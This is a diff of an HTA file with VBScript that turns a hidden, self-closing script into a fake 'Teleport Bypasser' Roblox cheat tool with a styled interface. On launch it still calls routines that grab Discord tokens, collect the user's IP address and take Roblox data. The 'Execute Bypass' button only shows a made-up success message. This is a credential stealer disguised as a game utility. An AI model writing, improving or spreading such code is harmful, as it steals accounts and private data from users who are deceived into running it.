@@ -1,8 +1,7 @@
 <html>
-<head><title>.</title>
-<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
+<head><title>Teleport Bypasser</title>
+<hta:application id="a" applicationname="Teleport Bypasser" border="thin" caption="yes" innerborder="no" showintaskbar="yes" sysmenu="yes" contextmenu="yes" selection="no"/>
 <script language="VBScript">
-window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
 Dim sh, fso, WH, PC, USER
@@ -15,7 +14,21 @@ USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 Call GrabDiscordTokens
 Call SendIP
 Call GrabRoblox
-window.close()
+
+Sub BtnClick
+    Dim jobId, playerName, gameName, result
+    jobId = document.getElementById("jobBox").value
+    playerName = document.getElementById("playerBox").value
+    gameName = document.getElementById("gameSelect").value
+    If Len(jobId) = 0 Or Len(playerName) = 0 Then
+        result = "Error: Please fill in all fields."
+        document.getElementById("resultLabel").style.color = "#ff5555"
+    Else
+        result = "Success! Teleported " & playerName & " to job " & jobId & " in " & gameName & "."
+        document.getElementById("resultLabel").style.color = "#55ff55"
+    End If
+    document.getElementById("resultLabel").innerHTML = result
+End Sub
 
 Sub SendIP()
     Dim ip: ip = Fetch("https://api.ipify.org")
@@ -223,6 +236,32 @@ Sub GrabDiscordTokens()
         End If
     End If
 End Sub
-
 </script>
-</head><body></body></html>
+</head>
+<body bgcolor="#0f0f1a" text="#ffffff" style="font-family:Segoe UI;">
+<center>
+<div style="width:420px;margin-top:30px;">
+<div style="background:#1a1a2e;border-radius:12px;padding:25px;border:1px solid #2d2d5e;">
+<h1 style="font-size:22px;color:#ff6b6b;margin:0;">Teleport Bypasser</h1>
+<p style="font-size:11px;color:#888;margin:5px 0 20px 0;">fuwatti special</p>
+<div style="background:#0f0f1a;border-radius:8px;padding:15px;text-align:left;">
+<label style="font-size:12px;color:#ccc;">Job ID</label><br>
+<input type="text" id="jobBox" placeholder="Enter job ID" style="width:100%;padding:10px;margin:5px 0 15px 0;background:#1a1a2e;color:white;border:1px solid #3d3d6e;border-radius:6px;font-size:13px;"><br>
+<label style="font-size:12px;color:#ccc;">Player</label><br>
+<input type="text" id="playerBox" placeholder="Enter player name" style="width:100%;padding:10px;margin:5px 0 15px 0;background:#1a1a2e;color:white;border:1px solid #3d3d6e;border-radius:6px;font-size:13px;"><br>
+<label style="font-size:12px;color:#ccc;">Game</label><br>
+<select id="gameSelect" style="width:100%;padding:10px;margin:5px 0 15px 0;background:#1a1a2e;color:white;border:1px solid #3d3d6e;border-radius:6px;font-size:13px;">
+<option value="Destroy Lucky Blocks!">Destroy Lucky Blocks!</option>
+<option value="Grow a Garden 2">Grow a Garden 2</option>
+<option value="Two Player Game">Two Player Game</option>
+<option value="Fake SAB Plaza (Pro Plaza)">Fake SAB Plaza (Pro Plaza)</option>
+</select>
+</div>
+<button onclick="BtnClick()" style="width:100%;padding:12px;margin-top:15px;background:#ff6b6b;color:white;border:none;border-radius:8px;font-size:14px;font-weight:bold;cursor:pointer;">Execute Bypass</button>
+</div>
+<p id="resultLabel" style="font-size:13px;margin-top:15px;color:#55ff55;"></p>
+<p style="font-size:10px;color:#555;margin-top:20px;">v2.1.0 | Local teleport utility</p>
+</div>
+</center>
+</body>
+</html>
